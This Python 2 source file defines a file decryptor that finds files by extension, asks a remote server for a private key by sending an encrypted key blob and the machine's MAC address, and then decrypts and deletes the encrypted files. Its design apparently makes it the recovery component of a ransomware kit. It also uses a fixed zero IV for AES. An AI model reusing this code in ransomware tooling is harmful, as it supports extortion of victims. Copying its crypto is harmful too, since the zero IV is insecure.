#TESTED ON PYTHON 2.7.17 WSL

import sys
sys.path.append("./lib/")

import json
import os
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as Cipher_PKCS1_v1_5
import base64
from sys import platform
import requests
import uuid

class Decryptor:
    files = []

    #For AES padding
    BS = 16
    def unpad(self,s):
        return s[:-ord(s[len(s)-1:])]

    def __init__(self,config_path):
        self.config_path = config_path
        self.__readConfig()

    def __readConfig(self):
        with open(self.config_path) as f:
            self.config = json.load(f)

    def __addSuitableFile(self):
        target_directory = self.config['target_directory'] or os.getcwd() 
        for(dirpath,dirnames,filenames) in os.walk(target_directory):
            for filename in filenames:
                if os.path.splitext(filename)[1] == self.config['extension']:
                    if platform == "linux" or platform =="linux2":
                        self.files.append(dirpath+'/'+filename)
                    else:
                            self.files.append(dirpath+'\\'+filename)
            if not self.config['iterate_folder']:
                break
    
    def __b64dec(self,param):
        return base64.b64decode(param)
    
    def __postRequest(self,url,body):
        try:
            r = requests.post(url,json=body)
            r.raise_for_status()
        except requests.exceptions.HTTPError as err:
            if(r.status_code >550 and r.status_code < 560):
                raise SystemExit(r.json()['error'])
            else:
                raise SystemExit(err)
        return r

    def __getMacAddress(self):
        return ':'.join(("%012X" % uuid.getnode())[i:i+2] for i in range(0, 12, 2))

    def decryptRsaKey(self,encryptedPrivateKeyPath,uuid):
        encKeyFile = open(encryptedPrivateKeyPath,"rb")
        encKey = encKeyFile.read()
        url = self.config['target_server']+'decrypt/'+uuid
        macAddr = self.__getMacAddress()
        body = {"data":encKey, "macAddr":macAddr}
        result = self.__postRequest(url,body)
        resultJson = result.json()
        with open("privkey1.der", "wb") as fOut:
            fOut.write(self.__b64dec(resultJson['key']))
    
    def __decryptPass(self,password,privatekey):
        password = self.__b64dec(password)
        priv = open(privatekey,"rb")
        privateKey = RSA.importKey(priv.read())
        cipher = Cipher_PKCS1_v1_5.new(privateKey)
        password = self.__b64dec(cipher.decrypt(password, None).decode())
        return password

    def __decryptFile(self,file):
        IV = 16 * '\x00'
        extension_len = len(self.config['extension'])
        with open(file,"rb") as fIn:
            arr_fIn = fIn.read().split(' ')
            password = self.__decryptPass(arr_fIn[0],"privkey1.der")
            # message = arr_fIn[1]
            message = self.__b64dec(arr_fIn[1])
            with open(file[:-extension_len], "wb") as fOut:
                aes = AES.new(password,AES.MODE_CBC,IV)
                fOut.write(self.unpad(aes.decrypt(message)))
            os.remove(file)

    def decryptFiles(self):
        self.__addSuitableFile()
        size = 0
        for file in self.files:
            size += os.path.getsize(file)
            self.__decryptFile(file)
        os.remove("privkey1.der")
        return size

    